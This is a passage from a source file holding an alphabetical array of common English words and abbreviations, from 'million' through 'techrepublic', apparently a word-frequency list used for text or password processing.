			"million", "millions", "mills", "milton", "milwaukee", "mime", "min", "mind", "minds", "mine",
			"mineral", "minerals", "mines", "mini", "miniature", "minimal", "minimize", "minimum", "mining", "minister",
			"ministers", "ministries", "ministry", "minneapolis", "minnesota", "minolta", "minor", "minority", "mins", "mint",
			"minus", "minute", "minutes", "miracle", "mirror", "mirrors", "misc", "miscellaneous", "miss", "missed",
			"missile", "missing", "mission", "missions", "mississippi", "missouri", "mistake", "mistakes", "mistress", "mit",
			"mitchell", "mitsubishi", "mix", "mixed", "mixer", "mixing", "mixture", "mj", "ml", "mlb",
			"mls", "mm", "mn", "mo", "mobile", "mobiles", "mobility", "mod", "mode", "model",
			"modeling", "modelling", "models", "modem", "modems", "moderate", "moderator", "moderators", "modern", "modes",
			"modification", "modifications", "modified", "modify", "mods", "modular", "module", "modules", "moisture", "mold",
			"moldova", "molecular", "molecules", "mom", "moment", "moments", "momentum", "moms", "mon", "monaco",
			"monday", "monetary", "money", "mongolia", "monica", "monitor", "monitored", "monitoring", "monitors", "monkey",
			"mono", "monroe", "monster", "montana", "monte", "montgomery", "month", "monthly", "months", "montreal",
			"mood", "moon", "moore", "moral", "more", "moreover", "morgan", "morning", "morocco", "morris",
			"morrison", "mortality", "mortgage", "mortgages", "moscow", "moses", "moss", "most", "mostly", "motel",
			"motels", "mother", "motherboard", "mothers", "motion", "motivated", "motivation", "motor", "motorcycle", "motorcycles",
			"motorola", "motors", "mount", "mountain", "mountains", "mounted", "mounting", "mounts", "mouse", "mouth",
			"move", "moved", "movement", "movements", "movers", "moves", "movie", "movies", "moving", "mozambique",
			"mozilla", "mp", "mpeg", "mpegs", "mpg", "mph", "mr", "mrna", "mrs", "ms",
			"msg", "msgid", "msgstr", "msie", "msn", "mt", "mtv", "mu", "much", "mud",
			"mug", "multi", "multimedia", "multiple", "mumbai", "munich", "municipal", "municipality", "murder", "murphy",
			"murray", "muscle", "muscles", "museum", "museums", "music", "musical", "musician", "musicians", "muslim",
			"muslims", "must", "mustang", "mutual", "muze", "mv", "mw", "mx", "my", "myanmar",
			"myers", "myrtle", "myself", "mysimon", "myspace", "mysql", "mysterious", "mystery", "myth", "n",
			"na", "nail", "nails", "naked", "nam", "name", "named", "namely", "names", "namespace",
			"namibia", "nancy", "nano", "naples", "narrative", "narrow", "nasa", "nascar", "nasdaq", "nashville",
			"nasty", "nat", "nathan", "nation", "national", "nationally", "nations", "nationwide", "native", "nato",
			"natural", "naturally", "naturals", "nature", "naughty", "nav", "naval", "navigate", "navigation", "navigator",
			"navy", "nb", "nba", "nbc", "nc", "ncaa", "nd", "ne", "near", "nearby",
			"nearest", "nearly", "nebraska", "nec", "necessarily", "necessary", "necessity", "neck", "necklace", "need",
			"needed", "needle", "needs", "negative", "negotiation", "negotiations", "neighbor", "neighborhood", "neighbors", "neil",
			"neither", "nelson", "neo", "neon", "nepal", "nerve", "nervous", "nest", "nested", "net",
			"netherlands", "netscape", "network", "networking", "networks", "neural", "neutral", "nevada", "never", "nevertheless",
			"new", "newark", "newbie", "newcastle", "newer", "newest", "newfoundland", "newly", "newport", "news",
			"newscom", "newsletter", "newsletters", "newspaper", "newspapers", "newton", "next", "nextel", "nfl", "ng",
			"nh", "nhl", "nhs", "ni", "niagara", "nicaragua", "nice", "nicholas", "nick", "nickel",
			"nickname", "nicole", "niger", "nigeria", "night", "nightlife", "nightmare", "nights", "nike", "nikon",
			"nil", "nine", "nintendo", "nipple", "nipples", "nirvana", "nissan", "nitrogen", "nj", "nl",
			"nm", "nn", "no", "noble", "nobody", "node", "nodes", "noise", "nokia", "nominated",
			"nomination", "nominations", "non", "none", "nonprofit", "noon", "nor", "norfolk", "norm", "normal",
			"normally", "norman", "north", "northeast", "northern", "northwest", "norton", "norway", "norwegian", "nos",
			"nose", "not", "note", "notebook", "notebooks", "noted", "notes", "nothing", "notice", "noticed",
			"notices", "notification", "notifications", "notified", "notify", "notion", "notre", "nottingham", "nov", "nova",
			"novel", "novels", "novelty", "november", "now", "nowhere", "np", "nr", "ns", "nsw",
			"nt", "ntsc", "nu", "nuclear", "nude", "nudist", "nudity", "nuke", "null", "number",
			"numbers", "numeric", "numerical", "numerous", "nurse", "nursery", "nurses", "nursing", "nut", "nutrition",
			"nutritional", "nuts", "nutten", "nv", "nvidia", "nw", "ny", "nyc", "nylon", "nz",
			"o", "oak", "oakland", "oaks", "oasis", "ob", "obesity", "obituaries", "obj", "object",
			"objective", "objectives", "objects", "obligation", "obligations", "observation", "observations", "observe", "observed", "observer",
			"obtain", "obtained", "obtaining", "obvious", "obviously", "oc", "occasion", "occasional", "occasionally", "occasions",
			"occupation", "occupational", "occupations", "occupied", "occur", "occurred", "occurrence", "occurring", "occurs", "ocean",
			"oclc", "oct", "october", "odd", "odds", "oe", "oecd", "oem", "of", "off",
			"offense", "offensive", "offer", "offered", "offering", "offerings", "offers", "office", "officer", "officers",
			"offices", "official", "officially", "officials", "offline", "offset", "offshore", "often", "og", "oh",
			"ohio", "oil", "oils", "ok", "okay", "oklahoma", "ol", "old", "older", "oldest",
			"olive", "oliver", "olympic", "olympics", "olympus", "om", "omaha", "oman", "omega", "omissions",
			"on", "once", "one", "ones", "ongoing", "onion", "online", "only", "ons", "ontario",
			"onto", "oo", "ooo", "oops", "op", "open", "opened", "opening", "openings", "opens",
			"opera", "operate", "operated", "operates", "operating", "operation", "operational", "operations", "operator", "operators",
			"opinion", "opinions", "opponent", "opponents", "opportunities", "opportunity", "opposed", "opposite", "opposition", "opt",
			"optical", "optics", "optimal", "optimization", "optimize", "optimum", "option", "optional", "options", "or",
			"oracle", "oral", "orange", "orbit", "orchestra", "order", "ordered", "ordering", "orders", "ordinance",
			"ordinary", "oregon", "org", "organ", "organic", "organisation", "organisations", "organised", "organisms", "organization",
			"organizational", "organizations", "organize", "organized", "organizer", "organizing", "orgasm", "orgy", "oriental", "orientation",
			"oriented", "origin", "original", "originally", "origins", "orlando", "orleans", "os", "oscar", "ot",
			"other", "others", "otherwise", "ottawa", "ou", "ought", "our", "ours", "ourselves", "out",
			"outcome", "outcomes", "outdoor", "outdoors", "outer", "outlet", "outline", "outlined", "outlook", "output",
			"outputs", "outreach", "outside", "outsourcing", "outstanding", "oval", "oven", "over", "overall", "overcome",
			"overhead", "overnight", "overseas", "overview", "owen", "own", "owned", "owner", "owners", "ownership",
			"owns", "oxford", "oxide", "oxygen", "oz", "ozone", "p", "pa", "pac", "pace",
			"pacific", "pack", "package", "packages", "packaging", "packard", "packed", "packet", "packets", "packing",
			"packs", "pad", "pads", "page", "pages", "paid", "pain", "painful", "paint", "paintball",
			"painted", "painting", "paintings", "pair", "pairs", "pakistan", "pal", "palace", "pale", "palestine",
			"palestinian", "palm", "palmer", "pam", "pamela", "pan", "panama", "panasonic", "panel", "panels",
			"panic", "panties", "pants", "pantyhose", "paper", "paperback", "paperbacks", "papers", "papua", "par",
			"para", "parade", "paradise", "paragraph", "paragraphs", "paraguay", "parallel", "parameter", "parameters", "parcel",
			"parent", "parental", "parenting", "parents", "paris", "parish", "park", "parker", "parking", "parks",
			"parliament", "parliamentary", "part", "partial", "partially", "participant", "participants", "participate", "participated", "participating",
			"participation", "particle", "particles", "particular", "particularly", "parties", "partition", "partly", "partner", "partners",
			"partnership", "partnerships", "parts", "party", "pas", "paso", "pass", "passage", "passed", "passenger",
			"passengers", "passes", "passing", "passion", "passive", "passport", "password", "passwords", "past", "pasta",
			"paste", "pastor", "pat", "patch", "patches", "patent", "patents", "path", "pathology", "paths",
			"patient", "patients", "patio", "patricia", "patrick", "patrol", "pattern", "patterns", "paul", "pavilion",
			"paxil", "pay", "payable", "payday", "paying", "payment", "payments", "paypal", "payroll", "pays",
			"pb", "pc", "pci", "pcs", "pct", "pd", "pda", "pdas", "pdf", "pdt",
			"pe", "peace", "peaceful", "peak", "pearl", "peas", "pediatric", "pee", "peeing", "peer",
			"peers", "pen", "penalties", "penalty", "pencil", "pendant", "pending", "penetration", "penguin", "peninsula",
			"penis", "penn", "pennsylvania", "penny", "pens", "pension", "pensions", "pentium", "people", "peoples",
			"pepper", "per", "perceived", "percent", "percentage", "perception", "perfect", "perfectly", "perform", "performance",
			"performances", "performed", "performer", "performing", "performs", "perfume", "perhaps", "period", "periodic", "periodically",
			"periods", "peripheral", "peripherals", "perl", "permalink", "permanent", "permission", "permissions", "permit", "permits",
			"permitted", "perry", "persian", "persistent", "person", "personal", "personality", "personalized", "personally", "personals",
			"personnel", "persons", "perspective", "perspectives", "perth", "peru", "pest", "pet", "pete", "peter",
			"petersburg", "peterson", "petite", "petition", "petroleum", "pets", "pf", "pg", "pgp", "ph",
			"phantom", "pharmaceutical", "pharmaceuticals", "pharmacies", "pharmacology", "pharmacy", "phase", "phases", "phd", "phenomenon",
			"phentermine", "phi", "phil", "philadelphia", "philip", "philippines", "philips", "phillips", "philosophy", "phoenix",
			"phone", "phones", "photo", "photograph", "photographer", "photographers", "photographic", "photographs", "photography", "photos",
			"photoshop", "php", "phpbb", "phrase", "phrases", "phys", "physical", "physically", "physician", "physicians",
			"physics", "physiology", "pi", "piano", "pic", "pichunter", "pick", "picked", "picking", "picks",
			"pickup", "picnic", "pics", "picture", "pictures", "pie", "piece", "pieces", "pierce", "pierre",
			"pig", "pike", "pill", "pillow", "pills", "pilot", "pin", "pine", "ping", "pink",
			"pins", "pioneer", "pipe", "pipeline", "pipes", "pirates", "piss", "pissing", "pit", "pitch",
			"pittsburgh", "pix", "pixel", "pixels", "pizza", "pj", "pk", "pl", "place", "placed",
			"placement", "places", "placing", "plain", "plains", "plaintiff", "plan", "plane", "planes", "planet",
			"planets", "planned", "planner", "planners", "planning", "plans", "plant", "plants", "plasma", "plastic",
			"plastics", "plate", "plates", "platform", "platforms", "platinum", "play", "playback", "playboy", "played",
			"player", "players", "playing", "playlist", "plays", "playstation", "plaza", "plc", "pleasant", "please",
			"pleased", "pleasure", "pledge", "plenty", "plot", "plots", "plug", "plugin", "plugins", "plumbing",
			"plus", "plymouth", "pm", "pmc", "pmid", "pn", "po", "pocket", "pockets", "pod",
			"podcast", "podcasts", "poem", "poems", "poet", "poetry", "point", "pointed", "pointer", "pointing",
			"points", "pokemon", "poker", "poland", "polar", "pole", "police", "policies", "policy", "polish",
			"polished", "political", "politicians", "politics", "poll", "polls", "pollution", "polo", "poly", "polyester",
			"polymer", "polyphonic", "pond", "pontiac", "pool", "pools", "poor", "pop", "pope", "popular",
			"popularity", "population", "populations", "por", "porcelain", "pork", "porn", "porno", "porsche", "port",
			"portable", "portal", "porter", "portfolio", "portion", "portions", "portland", "portrait", "portraits", "ports",
			"portsmouth", "portugal", "portuguese", "pos", "pose", "posing", "position", "positioning", "positions", "positive",
			"possess", "possession", "possibilities", "possibility", "possible", "possibly", "post", "postage", "postal", "postcard",
			"postcards", "posted", "poster", "posters", "posting", "postings", "postposted", "posts", "pot", "potato",
			"potatoes", "potential", "potentially", "potter", "pottery", "poultry", "pound", "pounds", "pour", "poverty",
			"powder", "powell", "power", "powered", "powerful", "powerpoint", "powers", "powerseller", "pp", "ppc",
			"ppm", "pr", "practical", "practice", "practices", "practitioner", "practitioners", "prague", "prairie", "praise",
			"pray", "prayer", "prayers", "pre", "preceding", "precious", "precipitation", "precise", "precisely", "precision",
			"predict", "predicted", "prediction", "predictions", "prefer", "preference", "preferences", "preferred", "prefers", "prefix",
			"pregnancy", "pregnant", "preliminary", "premier", "premiere", "premises", "premium", "prep", "prepaid", "preparation",
			"prepare", "prepared", "preparing", "prerequisite", "prescribed", "prescription", "presence", "present", "presentation", "presentations",
			"presented", "presenting", "presently", "presents", "preservation", "preserve", "president", "presidential", "press", "pressed",
			"pressing", "pressure", "preston", "pretty", "prev", "prevent", "preventing", "prevention", "preview", "previews",
			"previous", "previously", "price", "priced", "prices", "pricing", "pride", "priest", "primarily", "primary",
			"prime", "prince", "princess", "princeton", "principal", "principle", "principles", "print", "printable", "printed",
			"printer", "printers", "printing", "prints", "prior", "priorities", "priority", "prison", "prisoner", "prisoners",
			"privacy", "private", "privilege", "privileges", "prix", "prize", "prizes", "pro", "probability", "probably",
			"probe", "problem", "problems", "proc", "procedure", "procedures", "proceed", "proceeding", "proceedings", "proceeds",
			"process", "processed", "processes", "processing", "processor", "processors", "procurement", "produce", "produced", "producer",
			"producers", "produces", "producing", "product", "production", "productions", "productive", "productivity", "products", "prof",
			"profession", "professional", "professionals", "professor", "profile", "profiles", "profit", "profits", "program", "programme",
			"programmer", "programmers", "programmes", "programming", "programs", "progress", "progressive", "prohibited", "project", "projected",
			"projection", "projector", "projectors", "projects", "prominent", "promise", "promised", "promises", "promising", "promo",
			"promote", "promoted", "promotes", "promoting", "promotion", "promotional", "promotions", "prompt", "promptly", "proof",
			"propecia", "proper", "properly", "properties", "property", "prophet", "proportion", "proposal", "proposals", "propose",
			"proposed", "proposition", "proprietary", "pros", "prospect", "prospective", "prospects", "prostate", "prostores", "prot",
			"protect", "protected", "protecting", "protection", "protective", "protein", "proteins", "protest", "protocol", "protocols",
			"prototype", "proud", "proudly", "prove", "proved", "proven", "provide", "provided", "providence", "provider",
			"providers", "provides", "providing", "province", "provinces", "provincial", "provision", "provisions", "proxy", "prozac",
			"ps", "psi", "psp", "pst", "psychiatry", "psychological", "psychology", "pt", "pts", "pty",
			"pub", "public", "publication", "publications", "publicity", "publicly", "publish", "published", "publisher", "publishers",
			"publishing", "pubmed", "pubs", "puerto", "pull", "pulled", "pulling", "pulse", "pump", "pumps",
			"punch", "punishment", "punk", "pupils", "puppy", "purchase", "purchased", "purchases", "purchasing", "pure",
			"purple", "purpose", "purposes", "purse", "pursuant", "pursue", "pursuit", "push", "pushed", "pushing",
			"pussy", "put", "puts", "putting", "puzzle", "puzzles", "pvc", "python", "q", "qatar",
			"qc", "qld", "qt", "qty", "quad", "qualification", "qualifications", "qualified", "qualify", "qualifying",
			"qualities", "quality", "quantitative", "quantities", "quantity", "quantum", "quarter", "quarterly", "quarters", "que",
			"quebec", "queen", "queens", "queensland", "queries", "query", "quest", "question", "questionnaire", "questions",
			"queue", "qui", "quick", "quickly", "quiet", "quilt", "quit", "quite", "quiz", "quizzes",
			"quotations", "quote", "quoted", "quotes", "r", "ra", "rabbit", "race", "races", "rachel",
			"racial", "racing", "rack", "racks", "radar", "radiation", "radical", "radio", "radios", "radius",
			"rage", "raid", "rail", "railroad", "railway", "rain", "rainbow", "raise", "raised", "raises",
			"raising", "raleigh", "rally", "ralph", "ram", "ran", "ranch", "rand", "random", "randy",
			"range", "rangers", "ranges", "ranging", "rank", "ranked", "ranking", "rankings", "ranks", "rap",
			"rape", "rapid", "rapidly", "rapids", "rare", "rarely", "rat", "rate", "rated", "rates",
			"rather", "rating", "ratings", "ratio", "rational", "ratios", "rats", "raw", "ray", "raymond",
			"rays", "rb", "rc", "rca", "rd", "re", "reach", "reached", "reaches", "reaching",
			"reaction", "reactions", "read", "reader", "readers", "readily", "reading", "readings", "reads", "ready",
			"real", "realistic", "reality", "realize", "realized", "really", "realm", "realtor", "realtors", "realty",
			"rear", "reason", "reasonable", "reasonably", "reasoning", "reasons", "rebate", "rebates", "rebecca", "rebel",
			"rebound", "rec", "recall", "receipt", "receive", "received", "receiver", "receivers", "receives", "receiving",
			"recent", "recently", "reception", "receptor", "receptors", "recipe", "recipes", "recipient", "recipients", "recognised",
			"recognition", "recognize", "recognized", "recommend", "recommendation", "recommendations", "recommended", "recommends", "reconstruction", "record",
			"recorded", "recorder", "recorders", "recording", "recordings", "records", "recover", "recovered", "recovery", "recreation",
			"recreational", "recruiting", "recruitment", "recycling", "red", "redeem", "redhead", "reduce", "reduced", "reduces",
			"reducing", "reduction", "reductions", "reed", "reef", "reel", "ref", "refer", "reference", "referenced",
			"references", "referral", "referrals", "referred", "referring", "refers", "refinance", "refine", "refined", "reflect",
			"reflected", "reflection", "reflections", "reflects", "reform", "reforms", "refresh", "refrigerator", "refugees", "refund",
			"refurbished", "refuse", "refused", "reg", "regard", "regarded", "regarding", "regardless", "regards", "reggae",
			"regime", "region", "regional", "regions", "register", "registered", "registrar", "registration", "registry", "regression",
			"regular", "regularly", "regulated", "regulation", "regulations", "regulatory", "rehab", "rehabilitation", "reid", "reject",
			"rejected", "rel", "relate", "related", "relates", "relating", "relation", "relations", "relationship", "relationships",
			"relative", "relatively", "relatives", "relax", "relaxation", "relay", "release", "released", "releases", "relevance",
			"relevant", "reliability", "reliable", "reliance", "relief", "religion", "religions", "religious", "reload", "relocation",
			"rely", "relying", "remain", "remainder", "remained", "remaining", "remains", "remark", "remarkable", "remarks",
			"remedies", "remedy", "remember", "remembered", "remind", "reminder", "remix", "remote", "removable", "removal",
			"remove", "removed", "removing", "renaissance", "render", "rendered", "rendering", "renew", "renewable", "renewal",
			"reno", "rent", "rental", "rentals", "rentcom", "rep", "repair", "repairs", "repeat", "repeated",
			"replace", "replaced", "replacement", "replacing", "replica", "replication", "replied", "replies", "reply", "report",
			"reported", "reporter", "reporters", "reporting", "reports", "repository", "represent", "representation", "representations", "representative",
			"representatives", "represented", "representing", "represents", "reprint", "reprints", "reproduce", "reproduced", "reproduction", "reproductive",
			"republic", "republican", "republicans", "reputation", "request", "requested", "requesting", "requests", "require", "required",
			"requirement", "requirements", "requires", "requiring", "res", "rescue", "research", "researcher", "researchers", "reseller",
			"reservation", "reservations", "reserve", "reserved", "reserves", "reservoir", "reset", "residence", "resident", "residential",
			"residents", "resist", "resistance", "resistant", "resolution", "resolutions", "resolve", "resolved", "resort", "resorts",
			"resource", "resources", "respect", "respected", "respective", "respectively", "respiratory", "respond", "responded", "respondent",
			"respondents", "responding", "response", "responses", "responsibilities", "responsibility", "responsible", "rest", "restaurant", "restaurants",
			"restoration", "restore", "restored", "restrict", "restricted", "restriction", "restrictions", "restructuring", "result", "resulted",
			"resulting", "results", "resume", "resumes", "retail", "retailer", "retailers", "retain", "retained", "retention",
			"retired", "retirement", "retreat", "retrieval", "retrieve", "retrieved", "retro", "return", "returned", "returning",
			"returns", "reunion", "reuters", "rev", "reveal", "revealed", "reveals", "revelation", "revenge", "revenue",
			"revenues", "reverse", "review", "reviewed", "reviewer", "reviewing", "reviews", "revised", "revision", "revisions",
			"revolution", "revolutionary", "reward", "rewards", "reynolds", "rf", "rfc", "rg", "rh", "rhode",
			"rhythm", "ri", "ribbon", "rica", "rice", "rich", "richard", "richards", "richardson", "richmond",
			"rick", "rico", "rid", "ride", "rider", "riders", "rides", "ridge", "riding", "right",
			"rights", "rim", "ring", "rings", "ringtone", "ringtones", "rio", "rip", "ripe", "rise",
			"rising", "risk", "risks", "river", "rivers", "riverside", "rj", "rl", "rm", "rn",
			"rna", "ro", "road", "roads", "rob", "robert", "roberts", "robertson", "robin", "robinson",
			"robot", "robots", "robust", "rochester", "rock", "rocket", "rocks", "rocky", "rod", "roger",
			"rogers", "roland", "role", "roles", "roll", "rolled", "roller", "rolling", "rolls", "rom",
			"roman", "romance", "romania", "romantic", "rome", "ron", "ronald", "roof", "room", "roommate",
			"roommates", "rooms", "root", "roots", "rope", "rosa", "rose", "roses", "ross", "roster",
			"rotary", "rotation", "rouge", "rough", "roughly", "roulette", "round", "rounds", "route", "router",
			"routers", "routes", "routine", "routines", "routing", "rover", "row", "rows", "roy", "royal",
			"royalty", "rp", "rpg", "rpm", "rr", "rrp", "rs", "rss", "rt", "ru",
			"rubber", "ruby", "rug", "rugby", "rugs", "rule", "ruled", "rules", "ruling", "run",
			"runner", "running", "runs", "runtime", "rural", "rush", "russell", "russia", "russian", "ruth",
			"rv", "rw", "rwanda", "rx", "ryan", "s", "sa", "sacramento", "sacred", "sacrifice",
			"sad", "saddam", "safari", "safe", "safely", "safer", "safety", "sage", "sagem", "said",
			"sail", "sailing", "saint", "saints", "sake", "salad", "salaries", "salary", "sale", "salem",
			"sales", "sally", "salmon", "salon", "salt", "salvador", "salvation", "sam", "samba", "same",
			"samoa", "sample", "samples", "sampling", "samsung", "samuel", "san", "sand", "sandra", "sandwich",
			"sandy", "sans", "santa", "sanyo", "sao", "sap", "sapphire", "sara", "sarah", "sas",
			"saskatchewan", "sat", "satellite", "satin", "satisfaction", "satisfactory", "satisfied", "satisfy", "saturday", "saturn",
			"sauce", "saudi", "savage", "savannah", "save", "saved", "saver", "saves", "saving", "savings",
			"saw", "say", "saying", "says", "sb", "sbjct", "sc", "scale", "scales", "scan",
			"scanned", "scanner", "scanners", "scanning", "scary", "scenario", "scenarios", "scene", "scenes", "scenic",
			"schedule", "scheduled", "schedules", "scheduling", "schema", "scheme", "schemes", "scholar", "scholars", "scholarship",
			"scholarships", "school", "schools", "sci", "science", "sciences", "scientific", "scientist", "scientists", "scoop",
			"scope", "score", "scored", "scores", "scoring", "scotia", "scotland", "scott", "scottish", "scout",
			"scratch", "screen", "screening", "screens", "screensaver", "screensavers", "screenshot", "screenshots", "screw", "script",
			"scripting", "scripts", "scroll", "scsi", "scuba", "sculpture", "sd", "se", "sea", "seafood",
			"seal", "sealed", "sean", "search", "searchcom", "searched", "searches", "searching", "seas", "season",
			"seasonal", "seasons", "seat", "seating", "seats", "seattle", "sec", "second", "secondary", "seconds",
			"secret", "secretariat", "secretary", "secrets", "section", "sections", "sector", "sectors", "secure", "secured",
			"securely", "securities", "security", "see", "seed", "seeds", "seeing", "seek", "seeker", "seekers",
			"seeking", "seeks", "seem", "seemed", "seems", "seen", "sees", "sega", "segment", "segments",
			"select", "selected", "selecting", "selection", "selections", "selective", "self", "sell", "seller", "sellers",
			"selling", "sells", "semester", "semi", "semiconductor", "seminar", "seminars", "sen", "senate", "senator",
			"senators", "send", "sender", "sending", "sends", "senegal", "senior", "seniors", "sense", "sensitive",
			"sensitivity", "sensor", "sensors", "sent", "sentence", "sentences", "seo", "sep", "separate", "separated",
			"separately", "separation", "sept", "september", "seq", "sequence", "sequences", "ser", "serbia", "serial",
			"series", "serious", "seriously", "serum", "serve", "served", "server", "servers", "serves", "service",
			"services", "serving", "session", "sessions", "set", "sets", "setting", "settings", "settle", "settled",
			"settlement", "setup", "seven", "seventh", "several", "severe", "sewing", "sex", "sexcam", "sexo",
			"sexual", "sexuality", "sexually", "sexy", "sf", "sg", "sh", "shade", "shades", "shadow",
			"shadows", "shaft", "shake", "shakespeare", "shakira", "shall", "shame", "shanghai", "shannon", "shape",
			"shaped", "shapes", "share", "shared", "shareholders", "shares", "shareware", "sharing", "shark", "sharon",
			"sharp", "shaved", "shaw", "she", "shed", "sheep", "sheer", "sheet", "sheets", "sheffield",
			"shelf", "shell", "shelter", "shemale", "shemales", "shepherd", "sheriff", "sherman", "shield", "shift",
			"shine", "ship", "shipment", "shipments", "shipped", "shipping", "ships", "shirt", "shirts", "shit",
			"shock", "shoe", "shoes", "shoot", "shooting", "shop", "shopper", "shoppercom", "shoppers", "shopping",
			"shoppingcom", "shops", "shopzilla", "shore", "short", "shortcuts", "shorter", "shortly", "shorts", "shot",
			"shots", "should", "shoulder", "show", "showcase", "showed", "shower", "showers", "showing", "shown",
			"shows", "showtimes", "shut", "shuttle", "si", "sic", "sick", "side", "sides", "sie",
			"siemens", "sierra", "sig", "sight", "sigma", "sign", "signal", "signals", "signature", "signatures",
			"signed", "significance", "significant", "significantly", "signing", "signs", "signup", "silence", "silent", "silicon",
			"silk", "silly", "silver", "sim", "similar", "similarly", "simon", "simple", "simplified", "simply",
			"simpson", "simpsons", "sims", "simulation", "simulations", "simultaneously", "sin", "since", "sing", "singapore",
			"singer", "singh", "singing", "single", "singles", "sink", "sip", "sir", "sister", "sisters",
			"sit", "site", "sitemap", "sites", "sitting", "situated", "situation", "situations", "six", "sixth",
			"size", "sized", "sizes", "sk", "skating", "ski", "skiing", "skill", "skilled", "skills",
			"skin", "skins", "skip", "skirt", "skirts", "sku", "sky", "skype", "sl", "slave",
			"sleep", "sleeping", "sleeps", "sleeve", "slide", "slides", "slideshow", "slight", "slightly", "slim",
			"slip", "slope", "slot", "slots", "slovak", "slovakia", "slovenia", "slow", "slowly", "slut",
			"sluts", "sm", "small", "smaller", "smart", "smell", "smile", "smilies", "smith", "smithsonian",
			"smoke", "smoking", "smooth", "sms", "smtp", "sn", "snake", "snap", "snapshot", "snow",
			"snowboard", "so", "soa", "soap", "soc", "soccer", "social", "societies", "society", "sociology",
			"socket", "socks", "sodium", "sofa", "soft", "softball", "software", "soil", "sol", "solar",
			"solaris", "sold", "soldier", "soldiers", "sole", "solely", "solid", "solo", "solomon", "solution",
			"solutions", "solve", "solved", "solving", "soma", "somalia", "some", "somebody", "somehow", "someone",
			"somerset", "something", "sometimes", "somewhat", "somewhere", "son", "song", "songs", "sonic", "sons",
			"sony", "soon", "soonest", "sophisticated", "sorry", "sort", "sorted", "sorts", "sought", "soul",
			"souls", "sound", "sounds", "soundtrack", "soup", "source", "sources", "south", "southampton", "southeast",
			"southern", "southwest", "soviet", "sox", "sp", "spa", "space", "spaces", "spain", "spam",
			"span", "spanish", "spank", "spanking", "sparc", "spare", "spas", "spatial", "speak", "speaker",
			"speakers", "speaking", "speaks", "spears", "spec", "special", "specialist", "specialists", "specialized", "specializing",
			"specially", "specials", "specialties", "specialty", "species", "specific", "specifically", "specification", "specifications", "specifics",
			"specified", "specifies", "specify", "specs", "spectacular", "spectrum", "speech", "speeches", "speed", "speeds",
			"spell", "spelling", "spencer", "spend", "spending", "spent", "sperm", "sphere", "spice", "spider",
			"spies", "spin", "spine", "spirit", "spirits", "spiritual", "spirituality", "split", "spoke", "spoken",
			"spokesman", "sponsor", "sponsored", "sponsors", "sponsorship", "sport", "sporting", "sports", "spot", "spotlight",
			"spots", "spouse", "spray", "spread", "spreading", "spring", "springer", "springfield", "springs", "sprint",
			"spy", "spyware", "sq", "sql", "squad", "square", "squirt", "squirting", "sr", "src",
			"sri", "ss", "ssl", "st", "stability", "stable", "stack", "stadium", "staff", "staffing",
			"stage", "stages", "stainless", "stakeholders", "stamp", "stamps", "stan", "stand", "standard", "standards",
			"standing", "standings", "stands", "stanford", "stanley", "star", "starring", "stars", "starsmerchant", "start",
			"started", "starter", "starting", "starts", "startup", "stat", "state", "stated", "statement", "statements",
			"states", "statewide", "static", "stating", "station", "stationery", "stations", "statistical", "statistics", "stats",
			"status", "statute", "statutes", "statutory", "stay", "stayed", "staying", "stays", "std", "ste",
			"steady", "steal", "steam", "steel", "steering", "stem", "step", "stephanie", "stephen", "steps",
			"stereo", "sterling", "steve", "steven", "stevens", "stewart", "stick", "sticker", "stickers", "sticks",
			"sticky", "still", "stock", "stockholm", "stockings", "stocks", "stolen", "stomach", "stone", "stones",
			"stood", "stop", "stopped", "stopping", "stops", "storage", "store", "stored", "stores", "stories",
			"storm", "story", "str", "straight", "strain", "strand", "strange", "stranger", "strap", "strategic",
			"strategies", "strategy", "stream", "streaming", "streams", "street", "streets", "strength", "strengthen", "strengthening",
			"strengths", "stress", "stretch", "strict", "strictly", "strike", "strikes", "striking", "string", "strings",
			"strip", "stripes", "strips", "stroke", "strong", "stronger", "strongly", "struck", "struct", "structural",
			"structure", "structured", "structures", "struggle", "stuart", "stuck", "stud", "student", "students", "studied",
			"studies", "studio", "studios", "study", "studying", "stuff", "stuffed", "stunning", "stupid", "style",
			"styles", "stylish", "stylus", "su", "sub", "subaru", "subcommittee", "subdivision", "subject", "subjects",
			"sublime", "sublimedirectory", "submission", "submissions", "submit", "submitted", "submitting", "subscribe", "subscriber", "subscribers",
			"subscription", "subscriptions", "subsection", "subsequent", "subsequently", "subsidiaries", "subsidiary", "substance", "substances", "substantial",
			"substantially", "substitute", "subtle", "suburban", "succeed", "success", "successful", "successfully", "such", "suck",
			"sucking", "sucks", "sudan", "sudden", "suddenly", "sue", "suffer", "suffered", "suffering", "sufficient",
			"sufficiently", "sugar", "suggest", "suggested", "suggesting", "suggestion", "suggestions", "suggests", "suicide", "suit",
			"suitable", "suite", "suited", "suites", "suits", "sullivan", "sum", "summaries", "summary", "summer",
			"summit", "sun", "sunday", "sunglasses", "sunny", "sunrise", "sunset", "sunshine", "super", "superb",
			"superintendent", "superior", "supervision", "supervisor", "supervisors", "supplement", "supplemental", "supplements", "supplied", "supplier",
			"suppliers", "supplies", "supply", "support", "supported", "supporters", "supporting", "supports", "suppose", "supposed",
			"supreme", "sur", "sure", "surely", "surf", "surface", "surfaces", "surfing", "surge", "surgeon",
			"surgeons", "surgery", "surgical", "surname", "surplus", "surprise", "surprised", "surprising", "surrey", "surround",
			"surrounded", "surrounding", "surveillance", "survey", "surveys", "survival", "survive", "survivor", "survivors", "susan",
			"suse", "suspect", "suspected", "suspended", "suspension", "sussex", "sustainability", "sustainable", "sustained", "suzuki",
			"sv", "sw", "swap", "sweden", "swedish", "sweet", "swift", "swim", "swimming", "swing",
			"swingers", "swiss", "switch", "switched", "switches", "switching", "switzerland", "sword", "sydney", "symantec",
			"symbol", "symbols", "sympathy", "symphony", "symposium", "symptoms", "sync", "syndicate", "syndication", "syndrome",
			"synopsis", "syntax", "synthesis", "synthetic", "syracuse", "syria", "sys", "system", "systematic", "systems",
			"t", "ta", "tab", "table", "tables", "tablet", "tablets", "tabs", "tackle", "tactics",
			"tag", "tagged", "tags", "tahoe", "tail", "taiwan", "take", "taken", "takes", "taking",
			"tale", "talent", "talented", "tales", "talk", "talked", "talking", "talks", "tall", "tamil",
			"tampa", "tan", "tank", "tanks", "tanzania", "tap", "tape", "tapes", "tar", "target",
			"targeted", "targets", "tariff", "task", "tasks", "taste", "tattoo", "taught", "tax", "taxation",
			"taxes", "taxi", "taylor", "tb", "tba", "tc", "tcp", "td", "te", "tea",
			"teach", "teacher", "teachers", "teaches", "teaching", "team", "teams", "tear", "tears", "tech",
			"technical", "technician", "technique", "techniques", "techno", "technological", "technologies", "technology", "techrepublic", "ted",
